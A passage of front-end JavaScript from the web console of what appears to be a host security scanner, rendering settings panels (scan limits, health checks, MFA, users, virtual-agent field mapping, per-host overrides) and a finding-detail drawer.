                      <td class="mono" style="font-size:0.78rem">${esc(tok ? shortId(tok) + "…" : "—")}</td>
                      <td class="hosts-actions">
                        <button type="button" class="btn ghost tiny" data-feed-virtual="${esc(h.id)}" data-feed-name="${esc(h.display_name)}">Import</button>
                        <button type="button" class="btn ghost tiny" data-goto-host="${esc(h.id)}">Open</button>
                      </td>
                    </tr>`;
                  }).join("")}
                </tbody></table>`}
          </div>
        </section>
      </div>`;
  }

  function settings() {
    const pack = state.settings;
    if (!pack) {
      return `<section class="panel"><div class="empty">Settings not loaded yet</div></section>`;
    }
    const eff = pack.effective || {};
    const catalog = pack.catalog || [];
    const ver = state.version;
    let tab = state._settingsTab || "overview";
    if (tab === "agentlite") tab = "overview";
    state._settingsTab = tab;
    const tabs = [
      ["overview", "Overview"],
      ["account", "Account"],
      ["users", "Users"],
      ["scanning", "Scanning"],
      ["infra", "Infrastructure"],
      ["virtual", "Virtual agents"],
      ["hosts", "Per-host"],
      ["catalog", "Catalog & export"],
    ];
    const pane = (id, html) =>
      `<div data-settings-pane="${id}" class="${tab === id ? "" : "hidden"}">${html}</div>`;

    const accountHtml = settingsAccountHtml();
    const usersHtml = settingsUsersHtml();

    const overviewHtml = `
      <section class="panel">
        <div class="panel-head">
          <h3>Build &amp; versions</h3>
          <div class="form-actions" style="margin:0;gap:0.5rem">
            <button type="button" class="btn ghost" id="btnReloadVersion">Refresh digests</button>
            <span class="muted">server v${esc(ver?.server?.version || eff.version || "?")}</span>
          </div>
        </div>
        ${versionRowsHtml(ver)}
      </section>
      <section class="panel">
        <div class="panel-head">
          <h3>Effective runtime</h3>
          <span class="muted">v${esc(eff.version || "?")}</span>
        </div>
        <div class="settings-kv">
          <div><dt>Listen</dt><dd>${esc(eff.listen)}</dd></div>
          <div><dt>Scan interval</dt><dd>${esc(eff.scan_interval)} ±${esc(eff.scan_jitter_pct)}%</dd></div>
          <div><dt>Check set</dt><dd>${esc(eff.default_check_set)}</dd></div>
          <div><dt>Scan history</dt><dd>${esc(eff.scan_history_per_host ?? 3)} finished / host</dd></div>
          <div><dt>Host health</dt><dd>${eff.host_health_enabled === false ? "disabled" : `every ${esc(eff.host_health_interval_secs ?? 60)}s · ${esc(eff.host_health_concurrency ?? 8)} concurrent`}</dd></div>
          <div><dt>Concurrency</dt><dd>${esc(eff.max_concurrent_scans)} · timeout ${esc(eff.scan_timeout_secs)}s</dd></div>
          <div><dt>Noise XX</dt><dd>${eff.noise_xx_enabled ? esc(eff.noise_xx_server_fingerprint || "enabled") : "disabled"}</dd></div>
          <div><dt>Seed demo</dt><dd>${eff.seed_demo ? `yes (${eff.seed_hosts} hosts)` : "no"}</dd></div>
          <div><dt>Scan sim</dt><dd>${eff.scan_sim ? "enabled" : "disabled"}</dd></div>
        </div>
      </section>`;

    const scanningHtml = `
      <div class="settings-grid">
        <section class="panel">
          <div class="panel-head"><h3>Scan retention</h3></div>
          <form class="form" id="fleetScanHistoryForm" style="padding:0 1.1rem 1rem;margin:0">
            <label>Finished scans kept per host
              <select name="scan_history_per_host">
                ${[1,3,5,10,20,50].map((v) => `<option value="${v}" ${Number(eff.scan_history_per_host ?? 3) === v ? "selected" : ""}>${v}</option>`).join("")}
              </select>
            </label>
            <p class="muted" style="margin:0.4rem 0 0.75rem;font-size:0.78rem">
              Newest finished scans are retained; active jobs are always kept. Per-host override: label <span class="mono">scan_history</span>.
            </p>
            <button type="submit" class="btn primary">Save scan history</button>
          </form>
        </section>
        <section class="panel">
          <div class="panel-head"><h3>Host health checks</h3></div>
          <form class="form" id="hostHealthForm" style="padding:0 1.1rem 1.1rem;margin:0">
            <p class="muted" style="margin:0 0 0.75rem;font-size:0.78rem">
              Lightweight TCP + SSH banner probe for every enrolled host. Drives Active / Offline status on the Hosts page (no full scan).
            </p>
            <label style="display:flex;align-items:center;gap:0.5rem;margin:0 0 0.75rem">
              <input name="enabled" type="checkbox" ${eff.host_health_enabled !== false ? "checked" : ""} />
              Enable periodic health checks
            </label>
            <div class="form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:0.6rem">
              <label>Interval (seconds)
                <select name="interval_secs">
                  ${[15,30,60,120,300,600].map((v) => `<option value="${v}" ${Number(eff.host_health_interval_secs ?? 60) === v ? "selected" : ""}>${v < 60 ? `${v}s` : `${v / 60}m`}</option>`).join("")}
                </select>
              </label>
              <label>Concurrency
                <select name="concurrency">
                  ${[1,2,4,8,16,32].map((v) => `<option value="${v}" ${Number(eff.host_health_concurrency ?? 8) === v ? "selected" : ""}>${v}</option>`).join("")}
                </select>
              </label>
              <label>Connect timeout (seconds)
                <select name="connect_timeout_secs">
                  ${[1,2,3,5,10].map((v) => `<option value="${v}" ${Number(eff.host_health_connect_timeout_secs ?? 3) === v ? "selected" : ""}>${v}s</option>`).join("")}
                </select>
              </label>
            </div>
            <button type="submit" class="btn primary" style="margin-top:0.75rem">Save host health</button>
          </form>
        </section>
      </div>
      <section class="panel">
        <div class="panel-head"><h3>Agent limits</h3></div>
        <form class="form" id="probeLimitsForm" style="padding:0 1.1rem 1.1rem;margin:0">
          <p class="muted" style="margin:0 0 0.75rem;font-size:0.78rem">
            Applied to <strong>both</strong> agents on every scan:
            the agentless probe (RLIMIT / nice / budget inside the ELF) and
            <strong>AgentLite</strong> (SSH commands — observation/file caps, nice/ionice/ulimit on the remote shell, transfer pacing).
            See <span class="mono">docs/03-probe-runtime.md</span>.
          </p>
          <div class="form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:0.6rem">
            <label>Max RSS (MiB)
              <input name="max_rss_mib" type="number" min="4" step="1" value="${esc(Math.round((eff.probe_max_rss_bytes || 25165824) / 1048576))}" />
            </label>
            <label>Nice (−20…19)
              <input name="nice" type="number" min="-20" max="19" value="${esc(eff.probe_nice ?? 19)}" />
            </label>
            <label>Transfer cap (KiB/s, 0=∞)
              <input name="max_transfer_kibps" type="number" min="0" value="${esc(Math.round((eff.probe_max_transfer_bps || 0) / 1024))}" />
            </label>
            <label>Max open files
              <input name="max_open_files" type="number" min="0" value="${esc(eff.probe_max_open_files ?? 256)}" />
            </label>
            <label>Max observations
              <input name="max_observations" type="number" min="1000" value="${esc(eff.probe_max_observations ?? 500000)}" />
            </label>
            <label>Max output (MiB)
              <input name="max_output_mib" type="number" min="1" value="${esc(Math.round((eff.probe_max_output_bytes || 67108864) / 1048576))}" />
            </label>
            <label>Max files examined
              <input name="max_files_examined" type="number" min="1000" value="${esc(eff.probe_max_files_examined ?? 2000000)}" />
            </label>
            <label>CPU hint % (0=nice only)
              <input name="max_cpu_pct" type="number" min="0" max="100" value="${esc(eff.probe_max_cpu_pct ?? 0)}" />
            </label>
          </div>
          <label style="display:flex;align-items:center;gap:0.5rem;margin:0.75rem 0">
            <input name="io_idle" type="checkbox" ${eff.probe_io_idle !== false ? "checked" : ""} />
            Idle I/O priority
          </label>
          <button type="submit" class="btn primary">Save agent limits</button>
        </form>
      </section>`;

    const infraHtml = `
      <section class="panel">
        <div class="panel-head">
          <h3>ClickHouse &amp; local paths</h3>
          <span class="muted">${eff.clickhouse_configured ? "connected" : "unset"}</span>
        </div>
        <div class="settings-kv">
          <div><dt>ClickHouse</dt><dd>${eff.clickhouse_configured ? esc(eff.clickhouse_url || "set") : "(unset)"}</dd></div>
          <div><dt>Database</dt><dd class="mono">${esc(eff.clickhouse_db || "rustmite")}</dd></div>
          <div><dt>Timeout</dt><dd>${esc(eff.clickhouse_timeout_secs ?? "—")}s</dd></div>
          <div><dt>logs</dt><dd class="mono">${esc(eff.server_log_path || ".dev/server.log")}</dd></div>
          <div><dt>config</dt><dd class="mono">${esc(eff.config_path || ".dev/config.env")}</dd></div>
          <div><dt>SSH identities</dt><dd class="mono">database <span class="muted">(node-sealed ciphertext)</span></dd></div>
          <div><dt>SSH secrets</dt><dd class="mono">database <span class="muted">(node-sealed ciphertext)</span></dd></div>
        </div>
        <p class="muted" style="margin:0 1.1rem 1rem;font-size:0.78rem">
          SSH identities and passwords are encrypted to the scanner-node public key (X25519) and stored in the control-plane database.
          The server <strong>cannot decrypt them again</strong> after upload — only live nodes can.
          To change a secret, delete and re-upload.
          <a href="https://docs.sandflysecurity.com/docs/credentials-security" target="_blank" rel="noopener">Sandfly-style credential security</a>.
        </p>
      </section>`;

    const vas = (state.hosts || []).filter((h) =>
      String(h.agent_kind || "").toLowerCase() === "virtual"
      || String(h.auth_status || "").toLowerCase() === "virtual"
    );
    const profiles = state.virtualAgents || [];
    const selectedId = state._vaProfileId
      || profiles[0]?.id
      || "";
    if (selectedId && state._vaProfileId !== selectedId) state._vaProfileId = selectedId;
    const selected = profiles.find((p) => p.id === selectedId) || null;
    const virtualHtml = virtualAgentsSettingsHtml(profiles, selected, vas);

    const hostsHtml = `
      <section class="panel">
        <div class="panel-head">
          <h3>Per-host overrides</h3>
          <span class="muted">${state.hosts.length} hosts</span>
        </div>
        <div style="padding:1rem 1.1rem">
          <p class="muted" style="margin:0 0 0.85rem;font-size:0.88rem">
            Override fleet scan cadence, preferred check set, and SSH/scan timeouts for one host.
            Empty fields keep the fleet default.
          </p>
          <label style="display:block;margin-bottom:0.75rem">Host
            <select id="hostSettingsPick">
              <option value="">Select a host…</option>
              ${state.hosts.slice(0, 500).map((h) => `<option value="${esc(h.id)}" ${state._settingsHostId === h.id ? "selected" : ""}>${esc(h.display_name)} · ${esc(h.primary_addr || "")}</option>`).join("")}
            </select>
          </label>
          <div id="hostSettingsFormWrap">${hostSettingsFormHtml(state._settingsHostId)}</div>
        </div>
      </section>`;

    const catalogHtml = `
      <div class="settings-grid">
        <section class="panel">
          <div class="panel-head"><h3>Export</h3></div>
          <div style="padding:1rem 1.1rem">
            <p class="muted" style="margin:0 0 0.85rem;font-size:0.9rem">
              Full catalog + effective values as JSON. Secrets are never included.
            </p>
            <div class="form-actions" style="justify-content:flex-start">
              <button class="btn primary" id="btnExportSettings">Export settings JSON</button>
              <button class="btn ghost" id="btnCopySettings">Copy JSON</button>
              <button class="btn ghost" id="btnReloadSettings">Reload</button>
            </div>
            <pre class="json" style="margin-top:1rem;max-height:220px">${esc(JSON.stringify(pack, null, 2))}</pre>
          </div>
        </section>
      </div>
      <section class="panel">
        <div class="panel-head">
          <h3>Changeable settings</h3>
          <span class="muted">${catalog.length} keys</span>
        </div>
        <table class="data"><thead><tr>
          <th>Key</th><th>Flag / env</th><th>Options</th><th>Effective</th><th>Notes</th>
        </tr></thead><tbody>
          ${catalog.map((c) => `<tr>
            <td><strong>${esc(c.key)}</strong>${c.secret ? ' <span class="tag">secret</span>' : ""}</td>
            <td class="mono">${esc(c.flag)}<div class="muted" style="font-size:0.72rem">${esc(c.env)}</div></td>
            <td class="mono">${(c.options || [c.default]).map((o) => esc(o)).join(" · ")}</td>
            <td class="mono">${esc(effectiveValue(c.key, eff))}</td>
            <td>${esc(c.description)}</td>
          </tr>`).join("")}
        </tbody></table>
      </section>`;

    return `
      <div class="settings-page">
        <div class="settings-tabs host-detail-tabs" role="tablist">
          ${tabs.map(([id, label]) =>
            `<button type="button" class="tab ${tab === id ? "active" : ""}" data-settings-tab="${id}" role="tab" aria-selected="${tab === id}">${label}</button>`
          ).join("")}
        </div>
        ${pane("overview", overviewHtml)}
        ${pane("account", accountHtml)}
        ${pane("users", usersHtml)}
        ${pane("scanning", scanningHtml)}
        ${pane("infra", infraHtml)}
        ${pane("virtual", virtualHtml)}
        ${pane("hosts", hostsHtml)}
        ${pane("catalog", catalogHtml)}
      </div>`;
  }

  function settingsAccountHtml() {
    const u = state.authUser;
    if (!u || u.username === "anonymous") {
      return `<section class="panel"><div class="empty">Sign in to manage MFA for your account.</div></section>`;
    }
    const mfaOn = !!u.totp_enabled;
    const setup = state._mfaSetup || null;
    return `
      <section class="panel">
        <div class="panel-head"><h3>Account</h3>
          <span class="muted">${esc(u.username)} · ${esc(u.role)}${mfaOn ? " · MFA on" : " · MFA off"}</span>
        </div>
        <p class="muted" style="margin:0 0 0.75rem;font-size:0.85rem">
          Multi-factor authentication (TOTP) — Google Authenticator, 1Password, Authy, etc.
        </p>
        ${mfaOn ? `
          <button type="button" class="btn ghost" id="btnMfaDisable">Disable MFA</button>
        ` : `
          ${!setup ? `<button type="button" class="btn primary" id="btnMfaSetup">Set up MFA</button>` : `
            <div class="mfa-setup-box">
              <p class="muted" style="margin:0;font-size:0.82rem">Add this account in your authenticator app (scan URI or enter secret).</p>
              <p class="mono mfa-secret">${esc(setup.secret)}</p>
              <details><summary class="muted" style="cursor:pointer;font-size:0.8rem">otpauth URI</summary>
                <p class="mono mfa-secret">${esc(setup.uri)}</p>
              </details>
              <label>6-digit code
                <input id="mfaEnableCode" inputmode="numeric" autocomplete="one-time-code" placeholder="000000" />
              </label>
              <button type="button" class="btn primary" id="btnMfaEnable">Enable MFA</button>
            </div>
          `}
        `}
      </section>`;
  }

  function settingsUsersHtml() {
    const u = state.authUser;
    if (!u || u.role !== "admin") {
      return `<section class="panel"><div class="empty">Admin role required to manage users.</div></section>`;
    }
    const users = state._authUsers || [];
    return `
      <section class="panel">
        <div class="panel-head"><h3>Users</h3>
          <button type="button" class="btn ghost" id="btnReloadUsers">Refresh</button>
        </div>
        <form class="form" id="createUserForm" style="margin-bottom:1rem">
          <div class="form-row">
            <label>Username <input name="username" required autocomplete="off" /></label>
            <label>Password <input name="password" type="password" required minlength="4" /></label>
            <label>Role
              <select name="role">
                <option value="analyst">analyst</option>
                <option value="viewer">viewer</option>
                <option value="admin">admin</option>
              </select>
            </label>
          </div>
          <button class="btn primary" type="submit">Create user</button>
        </form>
        ${!users.length ? `<div class="empty">No users loaded</div>` : `
          <table class="data"><thead><tr>
            <th>User</th><th>Role</th><th>MFA</th><th></th>
          </tr></thead><tbody>
            ${users.map((x) => `<tr>
              <td>${esc(x.username)}</td>
              <td>${esc(x.role)}</td>
              <td>${x.totp_enabled ? "on" : "off"}</td>
              <td><button type="button" class="btn ghost tiny" data-del-user="${esc(x.id)}" ${x.id === u.id ? "disabled" : ""}>Delete</button></td>
            </tr>`).join("")}
          </tbody></table>`}
      </section>`;
  }

  function downloadSettings() {
    if (!state.settings) {
      toast("No settings loaded");
      return;
    }
    const blob = new Blob([JSON.stringify(state.settings, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `rustmite-settings-${(state.settings.exported_at || "export").replace(/[:.]/g, "-")}.json`;
    a.click();
    URL.revokeObjectURL(url);
    toast("Settings exported");
  }

  async function copySettings() {
    if (!state.settings) return;
    try {
      await navigator.clipboard.writeText(JSON.stringify(state.settings, null, 2));
      toast("Settings JSON copied");
    } catch (_) {
      toast("Clipboard unavailable");
    }
  }

  function wireVirtualAgentSettings() {
    $$("[data-va-select]").forEach((btn) => {
      btn.addEventListener("click", () => {
        state._vaProfileId = btn.getAttribute("data-va-select") || "";
        render();
      });
    });
    $("#btnVaNew")?.addEventListener("click", async () => {
      try {
        const p = await api("/v1/virtual-agents", {
          method: "POST",
          body: {
            name: "Custom mapping",
            description: "User-defined JSONL field map",
            from_preset: "pulsesecure",
            preset: "custom",
            kind: "auto",
          },
        });
        state.virtualAgents = [...(state.virtualAgents || []).filter((x) => x.id !== p.id), p];
        state._vaProfileId = p.id;
        toast("Profile created");
        render();
      } catch (err) {
        toast(err.message);
      }
    });
    $("#btnVaDelete")?.addEventListener("click", async () => {
      const id = state._vaProfileId;
      if (!id) return;
      if (!confirm(`Delete virtual agent profile ${id}?`)) return;
      try {
        await api(`/v1/virtual-agents/${encodeURIComponent(id)}`, { method: "DELETE" });
        state.virtualAgents = (state.virtualAgents || []).filter((x) => x.id !== id);
        state._vaProfileId = state.virtualAgents[0]?.id || "";
        toast("Profile deleted");
        render();
      } catch (err) {
        toast(err.message);
      }
    });
    $("#btnVaResetPreset")?.addEventListener("click", async () => {
      const form = $("#vaProfileForm");
      if (!form) return;
      const preset = form.preset?.value || "pulsesecure";
      try {
        const pack = await api("/v1/virtual-agents/presets");
        const hit = (pack.presets || []).find((x) => x.id === preset) || (pack.presets || [])[0];
        if (!hit?.map) {
          toast("Preset not found");
          return;
        }
        const id = form.id?.value;
        const saved = await api(`/v1/virtual-agents/${encodeURIComponent(id)}`, {
          method: "PUT",
          body: {
            name: form.name?.value || hit.id,
            description: form.description?.value || hit.description || "",
            preset: hit.id,
            from_preset: hit.id,
            kind: form.kind?.value || "auto",
            map: hit.map,
          },
        });
        state.virtualAgents = (state.virtualAgents || []).map((x) => (x.id === saved.id ? saved : x));
        toast(`Reset to ${hit.id}`);
        render();
      } catch (err) {
        toast(err.message);
      }
    });
    $("#vaProfileForm")?.addEventListener("submit", async (e) => {
      e.preventDefault();
      const form = e.target;
      const fd = new FormData(form);
      const id = String(fd.get("id") || "");
      const body = {
        name: String(fd.get("name") || "").trim(),
        description: String(fd.get("description") || "").trim(),
        preset: String(fd.get("preset") || "custom"),
        kind: String(fd.get("kind") || "auto"),
        map: {
          preset: String(fd.get("preset") || "custom"),
          process: {
            name: readAliases(fd, "proc_name"),
            command: readAliases(fd, "proc_command"),
            path: readAliases(fd, "proc_path"),
            args: readAliases(fd, "proc_args"),
            pid: readAliases(fd, "proc_pid"),
            ppid: readAliases(fd, "proc_ppid"),
            uid: readAliases(fd, "proc_uid"),
            machine_id: readAliases(fd, "proc_machine"),
            timestamp: readAliases(fd, "proc_ts"),
            compose: String(fd.get("compose") || "command_field"),
          },
          file: {
            path: readAliases(fd, "file_path"),
            machine_id: readAliases(fd, "file_machine"),
            timestamp: readAliases(fd, "file_ts"),
            mtime: readAliases(fd, "file_mtime"),
            permissions: readAliases(fd, "file_perms"),
            owner: readAliases(fd, "file_owner"),
            group: readAliases(fd, "file_group"),
            size: readAliases(fd, "file_size"),
          },
        },
      };
      try {
        const saved = await api(`/v1/virtual-agents/${encodeURIComponent(id)}`, {
          method: "PUT",
          body,
        });
        state.virtualAgents = (state.virtualAgents || []).map((x) => (x.id === saved.id ? saved : x));
        toast("Profile saved");
        render();
      } catch (err) {
        toast(err.message);
      }
    });
    $("#btnVaPreview")?.addEventListener("click", async () => {
      const sample = $("#vaPreviewSample")?.value || "";
      const out = $("#vaPreviewOut");
      if (!sample.trim()) {
        toast("Paste sample JSONL first");
        return;
      }
      const form = $("#vaProfileForm");
      const fd = form ? new FormData(form) : null;
      const map = fd
        ? {
            preset: String(fd.get("preset") || "custom"),
            process: {
              name: readAliases(fd, "proc_name"),
              command: readAliases(fd, "proc_command"),
              path: readAliases(fd, "proc_path"),
              args: readAliases(fd, "proc_args"),
              pid: readAliases(fd, "proc_pid"),
              ppid: readAliases(fd, "proc_ppid"),
              uid: readAliases(fd, "proc_uid"),
              machine_id: readAliases(fd, "proc_machine"),
              timestamp: readAliases(fd, "proc_ts"),
              compose: String(fd.get("compose") || "command_field"),
            },
            file: {
              path: readAliases(fd, "file_path"),
              machine_id: readAliases(fd, "file_machine"),
              timestamp: readAliases(fd, "file_ts"),
              mtime: readAliases(fd, "file_mtime"),
              permissions: readAliases(fd, "file_perms"),
              owner: readAliases(fd, "file_owner"),
              group: readAliases(fd, "file_group"),
              size: readAliases(fd, "file_size"),
            },
          }
        : undefined;
      try {
        const res = await api("/v1/virtual-agents/preview", {
          method: "POST",
          body: { sample, map, limit: 8 },
        });
        if (out) {
          const keys = (res.keys || []).slice(0, 24).join(", ");
          const rows = (res.rows || []).map((r, i) => {
            const m = r.mapped;
            if (!m) return `<div class="mono">#${i + 1} — (unmapped) keys=${esc((r.raw_keys || []).slice(0, 8).join(","))}</div>`;
            return `<div class="mono">#${i + 1} ${esc(m.name || "?")} pid=${esc(String(m.pid ?? ""))} path=${esc(m.path || "")} args=${esc((m.args || "").slice(0, 60))}</div>`;
          }).join("");
          out.innerHTML = `<div><strong>Keys seen:</strong> ${esc(keys || "—")}</div>${rows || "<div class='empty'>No process rows mapped</div>"}`;
        }
      } catch (err) {
        toast(err.message);
      }
    });
  }

  async function loadAuthUsers() {
    if (!state.authUser || state.authUser.role !== "admin") return;
    try {
      state._authUsers = await api("/v1/auth/users");
    } catch (_) {
      state._authUsers = [];
    }
  }

  function wireAuthSettings() {
    $("#btnMfaSetup")?.addEventListener("click", async () => {
      try {
        state._mfaSetup = await api("/v1/auth/totp/setup", { method: "POST", body: {} });
        toast("Scan or enter the secret in your authenticator");
        render();
      } catch (err) {
        toast(err.message);
      }
    });
    $("#btnMfaEnable")?.addEventListener("click", async () => {
      const code = ($("#mfaEnableCode")?.value || "").trim();
      try {
        await api("/v1/auth/totp/enable", { method: "POST", body: { code } });
        state._mfaSetup = null;
        state.authUser = await fetchMe();
        toast("MFA enabled");
        render();
      } catch (err) {
        toast(err.message || "Invalid code");
      }
    });
    $("#btnMfaDisable")?.addEventListener("click", async () => {
      if (!confirm("Disable MFA for your account?")) return;
      try {
        await api("/v1/auth/totp/disable", { method: "POST", body: {} });
        state.authUser = await fetchMe();
        toast("MFA disabled");
        render();
      } catch (err) {
        toast(err.message);
      }
    });
    $("#btnReloadUsers")?.addEventListener("click", async () => {
      await loadAuthUsers();
      render();
    });
    $("#createUserForm")?.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      try {
        await api("/v1/auth/users", {
          method: "POST",
          body: {
            username: String(fd.get("username") || "").trim(),
            password: String(fd.get("password") || ""),
            role: String(fd.get("role") || "analyst"),
          },
        });
        toast("User created");
        await loadAuthUsers();
        render();
      } catch (err) {
        toast(err.message);
      }
    });
    $$("[data-del-user]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const id = btn.getAttribute("data-del-user");
        if (!id || !confirm("Delete this user?")) return;
        try {
          await api(`/v1/auth/users/${encodeURIComponent(id)}`, { method: "DELETE" });
          toast("User deleted");
          await loadAuthUsers();
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    });
    if (
      state._settingsTab === "users"
      && state.authUser?.role === "admin"
      && state._authUsers == null
      && !state._authUsersLoading
    ) {
      state._authUsersLoading = true;
      loadAuthUsers()
        .finally(() => {
          state._authUsersLoading = false;
          if (state._settingsTab === "users") render();
        });
    }
  }

  function wireHostSettingsForm() {
    const form = $("#hostSettingsForm");
    if (!form) return;
    const hostId = state._settingsHostId;
    const h = state.hosts.find((x) => x.id === hostId);
    if (!h) return;
    const numOrUndef = (v) => {
      const s = String(v ?? "").trim();
      if (!s) return undefined;
      const n = Number(s);
      return Number.isFinite(n) ? n : undefined;
    };
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(form);
      const labelsOut = { ...(h.labels || {}) };
      const setLabel = (k, v) => {
        const t = String(v || "").trim();
        if (t) labelsOut[k] = t;
        else delete labelsOut[k];
      };
      setLabel("check_set", fd.get("check_set"));
      applyAutoCollectFromForm(fd, labelsOut, { checkboxMode: false });
      setLabel("scan_history", fd.get("scan_history"));
      delete labelsOut.default_check_set;
      delete labelsOut.scan_history_per_host;
      try {
        await api(`/v1/hosts/${hostId}`, {
          method: "PATCH",
          body: {
            labels: labelsOut,
            timeouts: {
              connect_timeout_secs: numOrUndef(fd.get("connect_timeout_secs")),
              auth_timeout_secs: numOrUndef(fd.get("auth_timeout_secs")),
              cmd_timeout_secs: numOrUndef(fd.get("cmd_timeout_secs")),
              inactivity_timeout_secs: numOrUndef(fd.get("inactivity_timeout_secs")),
              delivery_timeout_secs: numOrUndef(fd.get("delivery_timeout_secs")),
              scan_timeout_secs: numOrUndef(fd.get("scan_timeout_secs")),
              connect_delay_ms: numOrUndef(fd.get("connect_delay_ms")),
            },
          },
        });
        toast(`Saved overrides for ${h.display_name}`);
        await loadAll();
      } catch (err) {
        toast(err.message);
      }
    });
    const clearBtn = $("#btnClearHostOverrides");
    if (clearBtn) {
      clearBtn.addEventListener("click", async () => {
        if (!window.confirm(`Reset overrides for ${h.display_name}? Scan schedule returns to Manual only.`)) return;
        const labelsOut = { ...(h.labels || {}) };
        delete labelsOut.check_set;
        delete labelsOut.default_check_set;
        labelsOut.scan_interval = "manual";
        delete labelsOut.scan_history;
        delete labelsOut.scan_history_per_host;
        try {
          await api(`/v1/hosts/${hostId}`, {
            method: "PATCH",
            body: {
              labels: labelsOut,
              timeouts: {},
            },
          });
          toast("Host overrides cleared");
          await loadAll();
        } catch (err) {
          toast(err.message);
        }
      });
    }
  }

  function findingDetail(f) {
    state.selectedFinding = f;
    const permalink = findingPermalink(f.id);
    const when = findingWhen(f);
    const evidence = Object.entries(f.evidence || {})
      .map(([k, v]) => `<dt>${esc(k)}</dt><dd class="mono">${esc(typeof v === "object" ? JSON.stringify(v) : v)}</dd>`)
      .join("");
    const hash = `#finding/${encodeURIComponent(f.id)}`;
    if (location.hash !== hash) history.replaceState(null, "", hash);
    const scanHref = f.scan_id ? `#/scans/${encodeURIComponent(f.scan_id)}` : "";
    const hostHref = `#host/${encodeURIComponent(f.host_id)}`;
    openDrawer(f.title || "Finding", `
      <div class="finding-detail-head">
        <div class="finding-detail-title">${esc(f.title || "Finding")}</div>
        <div class="finding-detail-meta">
          ${sev(f.severity)}
          <span class="pill">${esc(f.check_id)}</span>
          <span class="muted">${esc(fmtWhen(when.finished || when.seen))}</span>
        </div>
      </div>
      <dl class="kv">
        <dt>When</dt><dd class="mono">${esc(fmtWhen(when.finished || when.seen))}</dd>
        <dt>First seen</dt><dd class="mono">${esc(fmtWhen(when.first))}</dd>
        <dt>Last seen</dt><dd class="mono">${esc(fmtWhen(when.last))}</dd>
        <dt>Scan</dt><dd>${f.scan_id
          ? `<a class="finding-link mono" href="${esc(scanHref)}" data-open-scan="${esc(f.scan_id)}">${esc(shortId(f.scan_id))}</a>
             <span class="muted"> · ${esc(when.check_set || "—")}${when.outcome ? ` · ${esc(when.outcome)}` : ""}</span>
             ${when.duration_ms != null ? `<div class="muted" style="font-size:0.75rem">duration ${esc(fmtDuration(when.duration_ms))}</div>` : ""}`
          : "—"}</dd>
        <dt>Host</dt><dd><a class="finding-link" href="${esc(hostHref)}" data-goto-host="${esc(f.host_id)}">${esc(hostName(f.host_id))}</a></dd>
        <dt>Severity</dt><dd>${sev(f.severity)}</dd>
        <dt>Confidence</dt><dd>${esc(f.confidence)}</dd>
        <dt>Check</dt><dd><span class="pill">${esc(f.check_id)}</span> <span class="muted">v${esc(f.check_version ?? "—")}</span></dd>
        <dt>Type</dt><dd>${esc(f.check_type || "—")}</dd>
        <dt>Status</dt><dd>${esc(f.status || "new")}</dd>
        <dt>Link</dt><dd class="mono finding-permalink"><a href="${esc(hash)}">${esc(permalink)}</a></dd>
        <dt>ATT&CK</dt><dd>${(f.attack || []).map((a) =>
          `<a class="tag" href="${esc(attackUrl(a))}" target="_blank" rel="noreferrer">${esc(a)}</a>`
        ).join(" ") || "—"}</dd>
      </dl>
      <h3 style="margin:1.25rem 0 0.5rem;font-size:0.95rem">Evidence</h3>
      <dl class="kv">${evidence || "<dd>None</dd>"}</dl>
      <h3 style="margin:1.25rem 0 0.5rem;font-size:0.95rem">Raw JSON</h3>
      <pre class="json">${esc(JSON.stringify(f, null, 2))}</pre>
      <div class="form-actions" style="margin-top:1rem">
        <button class="btn ghost" data-copy-finding="${esc(permalink)}">Copy link</button>
        ${f.scan_id ? `<button class="btn ghost" data-open-scan="${esc(f.scan_id)}">Open scan</button>` : ""}
        <button class="btn ghost" data-goto-host="${esc(f.host_id)}">Open host</button>
        <button class="btn ghost" data-recheck="${esc(f.host_id)}">Recheck host</button>
        <button class="btn ghost" data-hunt-from-finding>Hunt related</button>
      </div>
    `);
    // If scan meta is thin / missing, refresh from API then re-render once.
    const needScan = f.scan_id && (!when.finished || when.duration_ms == null || !when.check_set);
    if (needScan && !state._findingScanFetched?.[f.id]) {
      state._findingScanFetched = state._findingScanFetched || {};
      state._findingScanFetched[f.id] = true;
      api(`/v1/scans/${f.scan_id}`).then((status) => {
        if (!status) return;
        const idx = (state.scans || []).findIndex((s) => String(s.job?.id || "") === String(f.scan_id));
        if (idx >= 0) state.scans[idx] = status;
        else state.scans = [status, ...(state.scans || [])];
        if (state.selectedFinding && String(state.selectedFinding.id) === String(f.id)) {
          findingDetail(f);
        }
      }).catch(() => {});
    }
    $$("#drawerBody [data-copy-finding]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const url = btn.getAttribute("data-copy-finding") || "";
        try {
          await navigator.clipboard.writeText(url);
          toast("Finding link copied");
        } catch (_) {
          toast(url);
        }
      });
    });
    $$("#drawerBody [data-goto-host]").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.preventDefault();
        const hid = btn.getAttribute("data-goto-host");
        if (hid) openHostById(hid).catch((err) => toast(err.message));
      });
    });
    $$("#drawerBody [data-open-scan]").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.preventDefault();
        const sid = btn.getAttribute("data-open-scan");
        if (sid) openScanById(sid).catch((err) => toast(err.message));
      });
    });
    $$("#drawerBody [data-recheck]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        try {
          await api(`/v1/hosts/${btn.dataset.recheck}/scan`, {
            method: "POST",
            body: { check_set: "standard", priority: 200 },
          });
          toast("Recheck queued");
          await loadLive();
        } catch (err) {
          toast(err.message);
        }
      });
    });
    $$("#drawerBody [data-hunt-from-finding]").forEach((btn) => {
      btn.addEventListener("click", () => {
        closeDrawer();
        setView("hunt");
      });
    });
  }

  function bindView() {
    $$("[data-settings-tab]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const id = btn.getAttribute("data-settings-tab") || "overview";
        state._settingsTab = id;
        $$("[data-settings-tab]").forEach((b) => {
          const on = b.getAttribute("data-settings-tab") === id;
          b.classList.toggle("active", on);
          b.setAttribute("aria-selected", on ? "true" : "false");
        });
        $$("[data-settings-pane]").forEach((p) => {
          p.classList.toggle("hidden", p.getAttribute("data-settings-pane") !== id);
